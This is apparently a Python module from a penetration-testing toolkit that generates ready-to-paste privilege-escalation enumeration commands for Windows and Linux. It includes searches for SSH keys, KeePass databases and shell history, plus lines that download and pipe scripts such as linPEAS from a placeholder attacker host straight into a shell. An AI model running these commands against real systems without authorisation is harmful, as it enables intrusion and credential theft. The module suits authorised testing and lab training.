"""Empusa - Privilege escalation enumeration command generator."""

from __future__ import annotations

from datetime import datetime
from pathlib import Path

from rich.prompt import Prompt

from empusa.cli_common import (
    CONFIG,
    console,
    log_info,
    log_success,
    render_screen,
)

WINDOWS_ENUM_COMMANDS: list[tuple[str, str]] = [
    ("Identity", "whoami"),
    ("Privileges", "whoami /priv"),
    ("Groups", "whoami /groups"),
    ("System Info", "systeminfo"),
    ("Local Users", "Get-LocalUser"),
    ("Local Groups", "Get-LocalGroup"),
    ("Administrators", "Get-LocalGroupMember Administrators"),
    ("Network Config", "ipconfig /all"),
    ("Routing Table", "route print"),
    ("Active Connections", "netstat -ano"),
    ("Running Processes", "Get-Process"),
    (
        "Running Services",
        "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
    ),
    (
        "Installed Apps (64)",
        'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname',
    ),
    (
        "Installed Apps (32)",
        'Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname',
    ),
    ("Scheduled Tasks", "schtasks /query /fo LIST /v"),
    ("Unquoted Svc Paths", 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""'),
    (
        "Writable Svc Bins",
        'Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like "Running"} | ForEach-Object { icacls $_.PathName.Trim(\'"\') 2>$null }',
    ),
    (
        "Security Patches",
        'Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }',
    ),
    ("PowerShell History", "(Get-PSReadLineOption).HistorySavePath"),
    ("KeePass DBs", "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"),
    (
        "Interesting Files",
        "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.conf,*.config -File -Recurse -ErrorAction SilentlyContinue",
    ),
    ("SUID-like (icacls)", 'icacls "C:\\Program Files" /T /C 2>$null | findstr /i "(F) (M) (W)"'),
    ("Credential Guard", "Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning"),
    ("Firewall Rules", "netsh advfirewall show allprofiles"),
]

LINUX_ENUM_COMMANDS: list[tuple[str, str]] = [
    ("Identity", "id"),
    ("Hostname", "hostname"),
    ("OS Release", "cat /etc/os-release 2>/dev/null || cat /etc/issue"),
    ("Kernel", "uname -a"),
    ("Users", "cat /etc/passwd | grep -v nologin | grep -v false"),
    ("Sudo Perms", "sudo -l 2>/dev/null"),
    ("SUID Binaries", "find / -perm -u=s -type f 2>/dev/null"),
    ("SGID Binaries", "find / -perm -g=s -type f 2>/dev/null"),
    ("Capabilities", "/usr/sbin/getcap -r / 2>/dev/null"),
    ("Cron Jobs (user)", "crontab -l 2>/dev/null"),
    ("Cron Jobs (system)", "ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null"),
    ("Cron Logs", "grep 'CRON' /var/log/syslog 2>/dev/null | tail -20"),
    ("Network Interfaces", "ip a 2>/dev/null || ifconfig"),
    ("Routing Table", "route 2>/dev/null || routel 2>/dev/null || ip route"),
    ("Listening Ports", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("Running Processes", "ps aux --sort=-%cpu | head -30"),
    ("Installed Packages", "dpkg -l 2>/dev/null | tail -30 || rpm -qa 2>/dev/null | tail -30"),
    ("Writable Dirs", "find / -writable -type d 2>/dev/null | head -20"),
    ("Writable /etc/passwd", "ls -la /etc/passwd"),
    ("Mounts", "mount; cat /etc/fstab 2>/dev/null"),
    ("Block Devices", "lsblk 2>/dev/null"),
    ("Kernel Modules", "lsmod 2>/dev/null | head -20"),
    ("Env Variables", "env"),
    ("Shell History", "cat ~/.bash_history 2>/dev/null | tail -50"),
    ("SSH Keys", "find / -name id_rsa -o -name authorized_keys -o -name id_ed25519 2>/dev/null"),
    (
        "Interesting Files",
        "find / -name '*.conf' -o -name '*.bak' -o -name '*.old' -o -name '*.kdbx' -o -name '*.db' 2>/dev/null | head -20",
    ),
    ("Firewall Rules", "cat /etc/iptables/rules.v4 2>/dev/null; iptables -L -n 2>/dev/null"),
    ("AppArmor Status", "aa-status 2>/dev/null"),
]


def privesc_enum_generator() -> None:
    """Interactive privilege escalation enumeration command generator."""
    render_screen("Privesc Enumeration Generator", "Generates ready-to-paste enumeration commands for privesc.")

    log_info("Target OS:")
    log_info("1. Windows")
    log_info("2. Linux")
    log_info("0. Back")

    os_choice = Prompt.ask("Select", choices=["0", "1", "2"])
    if os_choice == "0":
        return

    if os_choice == "1":
        commands = WINDOWS_ENUM_COMMANDS
        os_label = "Windows"
        auto_tools = [
            ("winPEAS", "iwr -uri http://<ATTACKER>/winPEASx64.exe -Outfile winPEAS.exe; .\\winPEAS.exe"),
            (
                "PowerUp",
                "iwr -uri http://<ATTACKER>/PowerUp.ps1 -Outfile PowerUp.ps1; . .\\PowerUp.ps1; Invoke-AllChecks",
            ),
            ("Seatbelt", "iwr -uri http://<ATTACKER>/Seatbelt.exe -Outfile Seatbelt.exe; .\\Seatbelt.exe -group=all"),
        ]
    else:
        commands = LINUX_ENUM_COMMANDS
        os_label = "Linux"
        auto_tools = [
            ("linPEAS", "curl http://<ATTACKER>/linpeas.sh | sh"),
            ("LinEnum", "curl http://<ATTACKER>/LinEnum.sh | bash"),
            ("unix-privesc-check", "unix-privesc-check standard"),
        ]

    log_info(f"\n[bold]{os_label} Enumeration Commands[/bold]")
    log_info("-" * 60)

    # Output modes
    log_info("\nOutput format:")
    log_info("1. Print to screen (copy/paste)")
    log_info("2. Save to file")
    log_info("3. Both")

    fmt_choice = Prompt.ask("Select", choices=["1", "2", "3"], default="1")

    lines: list[str] = []
    lines.append(f"# === {os_label} Privilege Escalation Enumeration ===")
    lines.append(f"# Generated by Empusa - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")

    lines.append("# -- Manual Enumeration ----------------------------")
    for label, cmd in commands:
        lines.append(f"\n# --- {label} ---")
        lines.append(cmd)

    lines.append("\n\n# -- Automated Tools -------------------------------")
    lines.append("# Transfer these to the target and run:")
    for name, cmd in auto_tools:
        lines.append(f"\n# --- {name} ---")
        lines.append(cmd)

    lines.append("")

    full_output = "\n".join(lines)

    if fmt_choice in ("1", "3"):
        console.print("")
        for line in lines:
            if line.startswith("# ===") or line.startswith("# -- "):
                console.print(line, style="bold yellow")
            elif line.startswith("# ---"):
                console.print(line, style="bold cyan")
            elif line.startswith("#"):
                console.print(line, style="dim")
            else:
                console.print(line, style="green")

    if fmt_choice in ("2", "3"):
        env = CONFIG.get("session_env", "")
        default_name = f"{env}_privesc_{os_label.lower()}.sh" if env else f"privesc_{os_label.lower()}.sh"
        filename = Prompt.ask("Save as", default=default_name).strip()
        out_path = Path(filename) if env == "" else Path(env) / filename
        out_path.write_text(full_output + "\n", encoding="utf-8")
        log_success(f"[+] Saved: {out_path}")
